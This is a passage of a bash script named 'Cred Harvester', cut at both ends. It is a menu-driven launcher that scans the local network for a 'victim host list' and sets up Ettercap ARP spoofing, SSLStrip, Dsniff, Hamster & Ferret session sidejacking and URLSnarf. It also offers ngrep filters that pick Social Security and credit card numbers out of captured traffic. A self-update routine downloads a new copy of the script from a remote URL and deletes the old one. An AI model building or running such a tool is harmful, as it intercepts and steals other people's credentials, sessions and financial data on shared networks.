	echo "$(tput setaf $Frame_Color)| $(tput setaf 2)[+] $(tput sgr0)Installing URLSnarf.... Please wait...                               $(tput setaf $Frame_Color)|$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
	apt-get install -y dsniff
	URLSnarfSanity=0
	fnSanityProgs
}

fnPythonInstall() {
	tput civis; tput cup $SanityMenuLength 0;
	echo "$(tput setaf $Frame_Color)| $(tput setaf 2)[+] $(tput sgr0)Installing Python.... Please wait...                                 $(tput setaf $Frame_Color)|$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
	apt-get install -y python
	PythonSanity=0
	fnSanityProgs
}

fnGawkInstall() {
	tput civis; tput cup $SanityMenuLength 0;
	echo "$(tput setaf $Frame_Color)| $(tput setaf 2)[+] $(tput sgr0)Installing Gawk.... Please wait...                                   $(tput setaf $Frame_Color)|$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
	apt-get install -y gawk
	GawkSanity=0
	fnSanityProgs
	}

fnLogInstall() {
	tput civis; tput cup $SanityMenuLength 0;
	echo "$(tput setaf $Frame_Color)| $(tput setaf 2)[+] $(tput sgr0)Creating log file.... Please wait...                                 $(tput setaf $Frame_Color)|$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
	mkdir -p $Final_Log_Clean
	LogSanity=0
	fnSanityProgs
}

fnUpdate() {
	VersionCheck=`curl -s $VersionLocation | grep -w CredHarvester | awk -F"=" '{ gsub (/[[:space:]]/,"",$2); print $2}'`
	CleanSelf=`awk -F"/" 'OFS="/" {gsub (/.*/,"",$NF); print}' <<< $0`
	tput civis; tput cup $SanityMenuLength 0;
	echo "$(tput setaf $Frame_Color)| $(tput setaf 2)[+] $(tput sgr0)Updating script.... Please wait...                                   $(tput setaf $Frame_Color)|$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
	wget -q -O $CleanSelf/40_Cred_Harvester_$VersionCheck.sh http://hax0rbl0x.googlecode.com/files/40_Cred_Harvester_$VersionCheck.sh
	rc=$?
	if [[ ! $rc -eq 0 || ! -e $CleanSelf/40_Cred_Harvester_$VersionCheck.sh ]]; then
		tput civis; tput cup $SanityMenuLength 0;
		rm $CleanSelf/40_Cred_Harvester_$VersionCheck.sh
		echo "$(tput setaf $Frame_Color)| $(tput setaf 1)[-] $(tput sgr0)Failed to update script... Please check your internet connection...  $(tput setaf $Frame_Color)|$(tput sgr0)"
		echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
		sleep 3
	else
		chmod 755 $CleanSelf/40_Cred_Harvester_$VersionCheck.sh
		tput civis; tput cup $SanityMenuLength 0;
		echo "$(tput setaf $Frame_Color)| $(tput setaf 2)[+] $(tput sgr0)Update successful... Script will now delete itself and exit...       $(tput setaf $Frame_Color)|$(tput sgr0)"
		echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
		rm $0
		sleep 3
		control_c
	fi
}

fnSel_Interface() {
	tput civis
	clear
	count=0
	echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|$(tput setaf $Splat_Color) * * * * * * * * * $(tput setaf $Title_Color)Cred Harvester Interface Selection$(tput setaf $Splat_Color) * * * * * * * * * * $(tput setaf $Frame_Color)|$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|                                                                          |$(tput sgr0)"
		while [[ $count -ne $Number_Interfaces ]]; do
			echo -e "$(tput setaf $Frame_Color)|$(tput setaf $Number_Color) [$count]$(tput sgr0) ${All_Interfaces[$count]} $(tput setaf $Frame_Color)$(tput cup $(($count + 4)) 75)|$(tput sgr0)"
			((count++))
		done
		echo -e "$(tput setaf $Frame_Color)|                                                                          |$(tput sgr0)"
		echo -e "$(tput setaf $Frame_Color)| $(tput setaf $Number_Color)[Q] $(tput setaf 7)Quit$(tput setaf $Frame_Color)                                                                 |$(tput sgr0)"
		echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
		while :; do
		tput cnorm
		echo -e "Please select an interface: \c" 
		read Selection
		Selection=`tr '[:upper:]' '[:lower:]' <<<$Selection`
		if [[ $Selection == "q" ]]; then
			control_c
		elif [[ ! "$Selection" =~ [0-9] || "$Selection" -ge "$count" ]]; then
		tput civis;
		echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
		echo "$(tput setaf $Frame_Color)| $(tput setaf 1)[-]$(tput sgr0) Please make a valid selection!                                       $(tput setaf $Frame_Color)|$(tput sgr0)"
		echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
		sleep 3
		else
			Interface="${All_Interfaces[$Selection]}"
			fnMainMenu
		fi
	done
}

fnMainMenu() {
	clear
	tput civis
	echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|$(tput setaf $Splat_Color)* * * * * * * * * * * * $(tput setaf $Title_Color)Cred Harvester Main Menu$(tput setaf $Splat_Color) * * * * * * * * * * * * *$(tput setaf $Frame_Color)|$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|                                                                          |$(tput sgr0)"
	echo -e "$(tput setaf $Frame_Color)| $(tput setaf $Number_Color)[1] $(tput setaf 7)Ettercap is currently$(tput sgr0)\c"
	if [[ -f "$Ettercap_Passive_Log" && `pgrep -f "ettercap"` ]]; then
		Ettercap=2
		fnLine_Draw 1 32
		echo "$(tput setaf 3)Already Running$(tput setaf $Frame_Color) |$(tput sgr0)"
	elif [[ $Ettercap -eq 0 ]]; then
		fnLine_Draw 1 39
		echo "$(tput setaf 1)Disabled$(tput setaf $Frame_Color) |$(tput sgr0)"
	elif [[ $Ettercap -eq 3 && -f /tmp/targets || "$Target1" || "$Target2" ]]; then
			fnLine_Draw 1 20
			echo " $(tput setaf 2)Enabled $(tput setaf 7)($(tput setaf 3)With Arpspoofing$(tput setaf 7))$(tput setaf $Frame_Color) |$(tput sgr0)"
	elif [[ $Ettercap -eq 1 ]]; then
			fnLine_Draw 1 39
			echo " $(tput setaf 2)Enabled$(tput setaf $Frame_Color) |$(tput sgr0)"
	fi
	echo -e "$(tput setaf $Frame_Color)| $(tput setaf $Number_Color)[2] $(tput setaf 7)SSLStrip is currently$(tput setaf $Line_Color) - - - - - - - - - - - - - - - - - - - \c"
	if [[ $SSLStrip -eq 0 ]]; then
		echo "$(tput setaf 1)Disabled$(tput setaf $Frame_Color) |$(tput sgr0)"
	else
		echo " $(tput setaf 2)Enabled$(tput setaf $Frame_Color) |$(tput sgr0)"
	fi
	echo -e "$(tput setaf $Frame_Color)| $(tput setaf $Number_Color)[3] $(tput setaf 7)Dsniff is currently$(tput setaf $Line_Color) - - - - - - - - - - - - - - - - - - - - \c"
	if [[ $Dsniff -eq 0 ]]; then
		echo "$(tput setaf 1)Disabled$(tput setaf $Frame_Color) |$(tput sgr0)"
	else
		echo " $(tput setaf 2)Enabled$(tput setaf $Frame_Color) |$(tput sgr0)"
	fi
	echo -e "$(tput setaf $Frame_Color)| $(tput setaf $Number_Color)[4] $(tput setaf 7)Hamster & Ferret (Sidejacking) is currently$(tput setaf $Line_Color) - - - - - - - - \c"
	if [[ $HandF -eq 0 ]]; then
		echo "$(tput setaf 1)Disabled$(tput setaf $Frame_Color) |$(tput sgr0)"
	else
		echo " $(tput setaf 2)Enabled$(tput setaf $Frame_Color) |$(tput sgr0)"
	fi
	echo -e "$(tput setaf $Frame_Color)| $(tput setaf $Number_Color)[5] $(tput setaf 7)NGREP \c"
	if [[ $NGREP -eq 0 ]]; then
		echo "is currently$(tput setaf $Line_Color)  - - - - - - - - - - - - - - - - - - - - $(tput setaf 1)Disabled$(tput setaf $Frame_Color) |$(tput sgr0)"
	else
		echo -e "($NGREP_filter_text) is currently$(tput setaf $Line_Color)\c"
		fnLine_Draw ${#NGREP_filter_text} 39
		echo "$(tput setaf 2)Enabled$(tput setaf $Frame_Color) |$(tput sgr0)"
	fi
	echo -e "$(tput setaf $Frame_Color)| $(tput setaf $Number_Color)[6] $(tput setaf 7)URLSnarf is currently$(tput setaf $Line_Color) - - - - - - - - - - - - - - - - - - - \c"
	if [[ $URLSnarf -eq 0 ]]; then
		echo "$(tput setaf 1)Disabled$(tput setaf $Frame_Color) |$(tput sgr0)"
	else
		echo " $(tput setaf 2)Enabled$(tput setaf $Frame_Color) |$(tput sgr0)"
	fi
	if [[ $URLSnarf -eq 1 ]]; then
		echo -e "$(tput setaf $Frame_Color)|     $(tput setaf $Number_Color)[7] $(tput setaf 7)Modify URLSnarf Filter$(tput setaf $Frame_Color)                                           |$(tput sgr0)"
	else
		echo "$(tput setaf $Frame_Color)|                                                                          |$(tput sgr0)"
	fi
	echo -e "$(tput setaf $Frame_Color)|                                                                          |$(tput sgr0)"
	echo -e "$(tput setaf $Frame_Color)| $(tput setaf $Number_Color)[9] $(tput setaf 7)Log file: $(tput setaf 3)$Final_Log$(tput setaf $Frame_Color)\c"
	for i in `seq ${#Final_Log} 58`
	do
	    echo -e " \c"
	done
	echo "$(tput setaf $Frame_Color)|$(tput sgr0)"
	echo -e "$(tput setaf $Frame_Color)|                                                                          |$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
	echo -e "$(tput setaf $Frame_Color)|   $(tput setaf $Number_Color)[X] $(tput setaf 7)Execute Script   |    $(tput setaf $Number_Color)[R] $(tput setaf 7)Reload Menu     |        $(tput setaf $Number_Color)[Q] $(tput setaf 7)Quit$(tput setaf $Frame_Color)        |$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
	while :; do
	tput cup $MainMenuLength 0; tput ed; tput cnorm
	tput cup $MainMenuLength 0; echo -n "Enter your menu choice: "
	read yourch
	yourch=`tr '[:upper:]' '[:lower:]' <<<$yourch`
	case $yourch in
	1) if [[ $Ettercap -eq 0 ]]; then if [[ $Hax -eq 1 ]]; then tput civis; Ettercap=1; tput setaf 2; tput cup 4 66; echo " Enabled"; tput sgr0; else fnTarget_Machines; fi; elif [[ $Ettercap -eq 2 ]]; then continue; else tput civis; Ettercap=0; if [[ -f /tmp/targets ]]; then rm /tmp/targets; fi; unset Target1 Target2; tput setaf 1; tput cup 4 48; echo "$(tput setaf $Line_Color)- - - - - - - - - $(tput setaf 1)Disabled$(tput setaf $Frame_Color) |"; tput sgr0; fi ;;
	2) if [[ $SSLStrip -eq 0 ]]; then tput civis; SSLStrip=1; tput setaf 2; tput cup 5 66; echo " Enabled"; tput sgr0; else tput civis; SSLStrip=0; tput setaf 1; tput cup 5 66; echo "Disabled$(tput setaf $Frame_Color) |"; tput sgr0; fi ;;
	3) if [[ $Dsniff -eq 0 ]]; then tput civis; Dsniff=1; tput setaf 2; tput cup 6 66; echo " Enabled"; tput sgr0; else tput civis; Dsniff=0; tput setaf 1; tput cup 6 66; echo "Disabled$(tput setaf $Frame_Color) |"; tput sgr0; fi ;;
	4) if [[ $HandF -eq 0 ]]; then tput civis; HandF=1; tput setaf 2; tput cup 7 66; echo " Enabled"; tput sgr0; else tput civis; HandF=0; tput setaf 1; tput cup 7 66; echo "Disabled$(tput setaf $Frame_Color) |"; tput sgr0; fi ;;
	5) if [[ $NGREP -eq 0 ]]; then fnNGREP_Choice; else NGREP=0; NGREP_Display=0; tput civis; HandF=0; tput cup 8 0; tput el; tput cup 8 0;echo "$(tput cup 8 0)$(tput setaf $Frame_Color)| $(tput setaf $Number_Color)[5] $(tput setaf 7)NGREP is currently$(tput setaf $Line_Color)  - - - - - - - - - - - - - - - - - - - - $(tput setaf 1)Disabled$(tput setaf $Frame_Color) |"; tput sgr0; fi ;;
	6) if [[ $URLSnarf -eq 0 ]]; then URLSnarf=1; fnMainMenu; else URLSnarf=0; URLSnarf_Filter=0; fnMainMenu; fi ;;
	7) if [[ $URLSnarf -eq 0 ]]; then tput civis; tput cup $MainMenuLength 0; echo "$(tput setaf $Frame_Color)|$(tput setaf 1) [-]$(tput sgr0) Please make a valid selection!                                       $(tput setaf $Frame_Color)|$(tput sgr0)"; echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"; sleep 3; else fnURLSnarf_Filter; fi ;;
	9) fnLogName ;;
	x) if (($Ettercap+$SSLStrip+$Dsniff+$HandF+$NGREP+$URLSnarf)); then fnLaunch; else tput civis; tput cup $MainMenuLength 0; echo "$(tput setaf $Frame_Color)| $(tput setaf 1)[-]$(tput sgr0) Please make a valid selection!                                       $(tput setaf $Frame_Color)|$(tput sgr0)"; echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"; sleep 3; fi ;;
	r) fnMainMenu ;;
	q) control_c ;;
	*) tput civis; tput cup $MainMenuLength 0; echo "$(tput setaf $Frame_Color)|$(tput setaf 1) [-]$(tput sgr0) Please make a valid selection!                                       $(tput setaf $Frame_Color)|$(tput sgr0)"; echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"; sleep 3 ;;
	esac
	done
}

fnLine_Draw() {
	Start=$1
	Spaces=$2
	for i in `seq $Start $Spaces`; do
		if [[ $temp -eq 0 ]]; then
			echo -e " \c"
			temp=1
			else
			echo -e "$(tput setaf $Line_Color)-$(tput sgr0)\c"
			temp=0
		fi
	done
	unset temp
}

fnTarget_Machines() {
	if [[ -f /tmp/targets ]]; then
		rm /tmp/targets
	fi
	while :; do
	tput reset
	echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|$(tput setaf $Splat_Color)* * * * * * * * * * * * $(tput setaf $Title_Color)MITM Interface Selection$(tput setaf $Splat_Color) * * * * * * * * * * * * *$(tput setaf $Frame_Color)|$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|                                                                          |$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|$(tput sgr0) $(tput setaf $Number_Color)[1] $(tput setaf 7)Create host list using NMAP                                          $(tput setaf $Frame_Color)|$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|                                                                          |$(tput sgr0)"
	echo -e "$(tput setaf $Frame_Color)| $(tput setaf $Number_Color)[2] $(tput setaf 7)Choose Target 1\c"
	if [[ "$Target1" ]]; then
		fnLine_Draw ${#Target1} 52
		echo -e "$(tput setaf 2)$Target1$(tput sgr0) \c"
	else
		fnLine_Draw 1 28
		echo -e "$(tput setaf 1)None selected/All targets$(tput sgr0) \c"
	fi
	echo -e "$(tput setaf $Frame_Color)|$(tput sgr0)"
	echo -e "$(tput setaf $Frame_Color)| $(tput setaf $Number_Color)[3] $(tput setaf 7)Choose Target 2\c"
	if [[ "$Target2" ]]; then
		fnLine_Draw ${#Target2} 52
		echo -e "$(tput setaf 2)$Target2$(tput sgr0) \c"
	else
		fnLine_Draw 1 28
		echo -e "$(tput setaf 1)None selected/All targets$(tput sgr0) \c"
	fi
	echo -e "$(tput setaf $Frame_Color)|$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|                                                                          |$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|$(tput sgr0) $(tput setaf $Number_Color)[Q] $(tput setaf 7)Return to previous menu                                              $(tput setaf $Frame_Color)|$(tput sgr0)"
	echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
	echo -n "Enter your menu choice: "
	read yourch
	yourch=$(tr '[:upper:]' '[:lower:]' <<<$yourch)
	case $yourch in
	1) fnNMAP ;;
	2) echo -e "\nPlease enter Target 1: \c"; read Target1 ;;
	3) echo -e "\nPlease enter Target 2: \c"; read Target2 ;;
	q) if [[ "$Target1" || "$Target2" || -f /tmp/targets ]]; then Ettercap=3; else Ettercap=1; fi; fnMainMenu ;;
	*) tput civis; tput cup 11 0; tput ed; echo "$(tput setaf 1)Please make a valid selection!$(tput sgr0)"; sleep 3 ;;
	
	esac
	done
}

fnNMAP() {
	if [[ -f /tmp/targets ]]; then
		rm /tmp/targets
	fi
	tput reset
	Current_Addresses=$(printf "%s," $(ifconfig | grep "inet" | grep -v "127.0.0.1" | awk '{print $2}' | sed 's/addr://g'))
	Current_Network=$(ifconfig $Interface | awk -F ' *|:' '/inet ad*r/{split($4,a,"\\."); printf("%d.%d.%d\n", a[1],a[2],a[3])}')
	echo -e "Please enter the network range you want to scan [$(tput setaf 2)$Current_Network.0/24$(tput sgr0)]: \c"
	read range
	if [[ ! "$range" ]]; then
		range="$Current_Network.0/24"
	fi
	tput civis
	echo -e "\n$(tput setaf 2)[+]$(tput sgr0) ARP Scanning Network...\c"
	nmap -PR -n -sn $range --exclude $Current_Addresses -oN /tmp/nmap.scan >/dev/null
	grep -e report -e MAC /tmp/nmap.scan | sed '{ N; s/\n/ /; s/Nmap scan report for //g; s/MAC Address: //g; s/ (.\+//g; s/$/ -/; }' > /tmp/targets
	echo -e "$(tput setaf 2)Complete$(tput sgr0)\n"
	
	echo -e "$(tput setaf $Splat_Color)~~~~~ $(tput setaf 7)Target List $(tput setaf $Splat_Color)~~~~~$(tput sgr0)\n"
	cat /tmp/targets
	echo ""
	tput cnorm
	read -p "Would you like to edit the victim host list? [y/$(tput setaf 2)N$(tput sgr0)] : " yn
	if [[ "$yn" && $(echo $yn | tr 'A-Z' 'a-z') == "y" ]]; then 
		nano /tmp/targets
	fi
	unset Target1 Target2
	Ettercap=3
	fnMainMenu
}

fnLogName() {
	tput civis; tput cup $MainMenuLength 0; echo -e "Please type in desired log name: \c"
	tput cnorm;
	read -e Log_Choice
	if [[ ! $Log_Choice ]]; then
			tput civis; tput cup $MainMenuLength 0;
			echo "$(tput setaf $Frame_Color)| $(tput setaf 1)[-]$(tput sgr0) No input! Keeping existing log file...                               $(tput setaf $Frame_Color)|$(tput sgr0)"
			echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
			sleep 3
	else
		Log_Choice_Clean=`awk -F"/" 'OFS="/" {gsub (/.*/,"",$NF); print}' <<< $Log_Choice`
		if [[ -d $Log_Choice_Clean ]]; then
			Final_Log="$Log_Choice"
			tput civis; tput cup 12 16; tput el; tput cup 12 16;
			echo -e "$(tput setaf 3)$Final_Log\c"
			for i in `seq ${#Final_Log} 58`
			do
				echo -e " \c"
			done
			echo "$(tput setaf $Frame_Color)|$(tput sgr0)"
		else
			tput civis; tput cup $MainMenuLength 0;
			echo "$(tput setaf $Frame_Color)| $(tput setaf 1)[-]$(tput sgr0) Directory does not exist! Keeping existing log file...               $(tput setaf $Frame_Color)|$(tput sgr0)"
			echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
			sleep 3
		fi
	fi
}

fnNGREP_Choice() {
	unset choice
	if [[ $(((`tput lines`-$MainMenuLength)-10)) -lt 0 ]]; then
		tput civis; tput cup 0 0; tput ed; tput cup 0 0;
		echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
		echo "$(tput setaf $Frame_Color)| $(tput sgr0)Possible NGREP Filters...$(tput setaf $Frame_Color)$(tput cup 1 75)|"
		echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
		echo "$(tput setaf $Frame_Color)| $(tput setaf $Number_Color)[1]$(tput setaf 7) Social Security Numbers$(tput setaf $Frame_Color)$(tput cup 3 75)|"
		echo "$(tput setaf $Frame_Color)| $(tput setaf $Number_Color)[2]$(tput setaf 7) Credit Card Numbers (May return false positives)$(tput setaf $Frame_Color)$(tput cup 4 75)|"
		echo "$(tput setaf $Frame_Color)| $(tput setaf $Number_Color)[3]$(tput setaf 7) Custom$(tput setaf $Frame_Color)$(tput cup 5 75)|"
		echo "$(tput setaf $Frame_Color)|                                                                          |$(tput sgr0)"
		echo "$(tput setaf $Frame_Color)| $(tput setaf $Number_Color)[Q]$(tput setaf 7) Cancel$(tput setaf $Frame_Color)$(tput cup 7 75)|"
		echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
	else
		tput civis; tput cup $MainMenuLength 0; tput ed; tput cup $MainMenuLength 0;
		echo "$(tput setaf $Frame_Color)| $(tput sgr0)Possible NGREP Filters...$(tput setaf $Frame_Color)$(tput cup $(($MainMenuLength)) 75)|"
		echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
		echo "$(tput setaf $Frame_Color)| $(tput setaf $Number_Color)[1]$(tput setaf 7) Social Security Numbers$(tput setaf $Frame_Color)$(tput cup $(($MainMenuLength + 2)) 75)|"
		echo "$(tput setaf $Frame_Color)| $(tput setaf $Number_Color)[2]$(tput setaf 7) Credit Card Numbers (May return false positives)$(tput setaf $Frame_Color)$(tput cup $(($MainMenuLength + 3)) 75)|"
		echo "$(tput setaf $Frame_Color)| $(tput setaf $Number_Color)[3]$(tput setaf 7) Custom$(tput setaf $Frame_Color)$(tput cup $(($MainMenuLength + 4)) 75)|"
		echo "$(tput setaf $Frame_Color)|                                                                          |$(tput sgr0)"
		echo "$(tput setaf $Frame_Color)| $(tput setaf $Number_Color)[Q]$(tput setaf 7) Cancel$(tput setaf $Frame_Color)$(tput cup $(($MainMenuLength + 6)) 75)|"
		echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
	fi
	tput cnorm
	echo -e "Please choose a filter: \c"
	read choice
	choice=`tr '[:upper:]' '[:lower:]' <<<$choice`
	if [[ $choice == "q" ]]; then
		fnMainMenu
	fi
	if [[ ! "$choice" =~ ^[0-9]+$ ]] ; then
		if [[ $(((`tput lines`-$MainMenuLength)-10)) -lt 0 ]]; then
			tput civis; tput cup 9 0; tput ed; tput cup 9 0;
		else
			tput civis; tput cup $MainMenuLength 0; tput ed; tput cup $MainMenuLength 0;
		fi
		echo "$(tput setaf $Frame_Color)| $(tput setaf 1)[-]$(tput sgr0) Please make a valid selection!                                       $(tput setaf $Frame_Color)|$(tput sgr0)"
		echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
		sleep 3
		if [[ $(((`tput lines`-$MainMenuLength)-10)) -lt 0 ]]; then
			fnNGREP_Choice
		fi
	fi
	if [[ $choice -eq 1 ]]; then
		NGREP_filter="-w '[0-9]{3}\-[0-9]{2}\-[0-9]{4}'"
		NGREP_filter_text="Social Security Number Filter"
		if [[ ! $(((`tput lines`-$MainMenuLength)-10)) -lt 0 ]]; then
			tput civis; tput cup 8 6
			echo -e "$(tput setaf 7)NGREP ($NGREP_filter_text) is currently$(tput setaf $Line_Color)\c"
			fnLine_Draw ${#NGREP_filter_text} 38
			echo " $(tput setaf 2)Enabled$(tput setaf $Frame_Color) |$(tput sgr0)"
		fi
		NGREP=1
	elif [[ $choice -eq 2 ]]; then
		NGREP_filter="'[0-9]{4}\-[0-9]{4}\-[0-9]{4}\-[0-9]{4}'"
		NGREP_filter_text="Credit Card Filter"
		if [[ ! $(((`tput lines`-$MainMenuLength)-10)) -lt 0 ]]; then
			tput civis;tput cup 8 6
			echo -e "$(tput setaf 7)NGREP ($NGREP_filter_text) is currently$(tput setaf $Line_Color)\c"
			fnLine_Draw ${#NGREP_filter_text} 38
			echo " $(tput setaf 2)Enabled$(tput setaf $Frame_Color) |$(tput sgr0)"
		fi
		NGREP=1
	elif [[ $choice -eq 3 ]]; then
		fnNGREP_Custom_Filter
	else
		if [[ $(((`tput lines`-$MainMenuLength)-10)) -lt 0 ]]; then
			tput civis; tput cup 9 0; tput ed; tput cup 9 0;
			echo "$(tput setaf $Frame_Color)| $(tput setaf 1)[-]$(tput sgr0) Please make a valid selection!                                       $(tput setaf $Frame_Color)|$(tput sgr0)"
			echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
			sleep 3
			fnNGREP_Choice
		else
			tput civis; tput cup $MainMenuLength 0; tput ed; tput cup $MainMenuLength 0;
			echo "$(tput setaf $Frame_Color)| $(tput setaf 1)[-]$(tput sgr0) Please make a valid selection!                                       $(tput setaf $Frame_Color)|$(tput sgr0)"
			echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
			sleep 3
		fi
	fi
	if [[ $(((`tput lines`-$MainMenuLength)-10)) -lt 0 ]]; then
		tput civis; tput cup 9 0; tput ed; tput cup 9 0; tput cnorm
	else
		tput civis; tput cup $MainMenuLength 0; tput ed; tput cup $MainMenuLength 0; tput cnorm
	fi
	echo -e "Would you like to display matches in display (May cause spam!) [no]? \c"
	read display
	display=`tr '[:upper:]' '[:lower:]' <<<$display`
	if [[ $display ]] && [[ $display == "y" || $display == "yes" ]]; then
		if [[ $(((`tput lines`-$MainMenuLength)-10)) -lt 0 ]]; then
			tput civis; tput cup 9 0; tput ed; tput cup 9 0;
		else
			tput civis; tput cup $MainMenuLength 0; tput ed; tput cup $MainMenuLength 0;
		fi
		echo -e "$(tput setaf $Frame_Color)| $(tput setaf 2)[+]$(tput sgr0) Will output NGREP ($NGREP_filter_text) to display.\c"
		for i in `seq ${#NGREP_filter_text} 36`
		do
			echo -e " \c"
		done
		echo "$(tput setaf $Frame_Color)|$(tput sgr0)"
		echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
		sleep 3
		NGREP_Display=1
		if [[ $(((`tput lines`-$MainMenuLength)-10)) -lt 0 ]]; then
			fnMainMenu
		fi
	else
		if [[ $(((`tput lines`-$MainMenuLength)-10)) -lt 0 ]]; then
			tput civis; tput cup 9 0; tput ed; tput cup 9 0;
		else
			tput civis; tput cup $MainMenuLength 0; tput ed; tput cup $MainMenuLength 0;
		fi
		echo -e "$(tput setaf $Frame_Color)| $(tput setaf 2)[+]$(tput sgr0) Will NOT output NGREP ($NGREP_filter_text) to display.\c"
		for i in `seq ${#NGREP_filter_text} 32`
		do
			echo -e " \c"
		done
		echo "$(tput setaf $Frame_Color)|$(tput sgr0)"
		echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
		sleep 3
		if [[ $(((`tput lines`-$MainMenuLength)-10)) -lt 0 ]]; then
			fnMainMenu
		fi
	fi
}

fnNGREP_Custom_Filter() {
	if [[ $(((`tput lines`-$MainMenuLength)-10)) -lt 0 ]]; then
		tput civis; tput cup 9 0; tput ed; tput cup 9 0; tput cnorm
	else
		tput civis; tput cup $MainMenuLength 0; tput ed; tput cup $MainMenuLength 0; tput cnorm
	fi
	echo -e "Please type in your custom NGREP filter (No tick marks):"
	echo -e ">> \c"
	read NGREP_filter_clean
	if [[ "$NGREP_filter_clean" ]]; then
		NGREP_filter_text="Custom Filter"
		if [[ ! $(((`tput lines`-$MainMenuLength)-10)) -lt 0 ]]; then
			tput civis; tput cup 8 6
			echo -e "$(tput setaf 7)NGREP ($NGREP_filter_text) is currently$(tput setaf $Line_Color)\c"
			fnLine_Draw ${#NGREP_filter_text} 38
			echo " $(tput setaf 2)Enabled$(tput setaf $Frame_Color) |$(tput sgr0)"
		fi
		NGREP_filter="'$NGREP_filter_clean'"
		NGREP=1
	else
		if [[ $(((`tput lines`-$MainMenuLength)-10)) -lt 0 ]]; then
			tput civis; tput cup 9 0; tput ed; tput cup 9 0;
		else
			tput civis; tput cup $MainMenuLength 0; tput ed; tput cup $MainMenuLength 0;
		fi
		echo "$(tput setaf $Frame_Color)| $(tput setaf 1)[-]$(tput sgr0) No input. Leaving NGREP disabled.                                    $(tput setaf $Frame_Color)|$(tput sgr0)"
		echo "$(tput setaf $Frame_Color)|--------------------------------------------------------------------------|$(tput sgr0)"
		unset NGREP_filter
		sleep 3
		fnMainMenu
	fi
}

fnLaunch() {
	tput reset; tput civis
	fnHeader
	if [[ $Ettercap -ge 1 ]]; then
		fnEttercap
	fi
	if [[ $SSLStrip -eq 1 ]]; then
		fnSSLStrip
	fi
	if [[ $Dsniff -eq 1 ]]; then
		fnDsniff
	fi
	if [[ $HandF -eq 1 ]]; then
		Current_Location=$PWD
		cd /tmp
		fnFerret
		cd $Current_Location
		unset Current_Location
	fi
	if [[ $NGREP -eq 1 ]]; then
		fnNGREP
	fi
	if [[ $URLSnarf -eq 1 ]]; then
		fnURLSnarf
	fi
	Lines=$(tput lines)
	Lines=$(($Lines-1))
	tput csr 11 $Lines; tput cup 11 0
	fnCH_Log
}

fnCursor() {
	program=$1
	color=$2
	if [[ $program -eq 0 ]]; then
		tput rc;tput sc;tput cup 1 44; echo "$(tput setaf 7)Runn$(tput sgr0)"; tput rc;
	elif [[ $program -eq 1 ]]; then
		tput rc;tput sc;tput cup 3 7; echo "$(tput setaf $color)Ettercap$(tput sgr0)"; tput rc;
	elif [[ $program -eq 2 ]]; then
		tput rc;tput sc;tput cup 3 18; echo "$(tput setaf $color)SSLStrip$(tput sgr0)"; tput rc;
	elif [[ $program -eq 3 ]]; then
		tput rc;tput sc;tput cup 3 29; echo "$(tput setaf $color)Dsniff$(tput sgr0)"; tput rc;
	elif [[ $program -eq 4 ]]; then
		tput rc;tput sc;tput cup 3 38; echo "$(tput setaf $color)Hamster$(tput sgr0)"; tput rc;
	elif [[ $program -eq 5 ]]; then
		tput rc;tput sc;tput cup 3 48; echo "$(tput setaf $color)Ferret$(tput sgr0)"; tput rc;
	elif [[ $program -eq 6 ]]; then
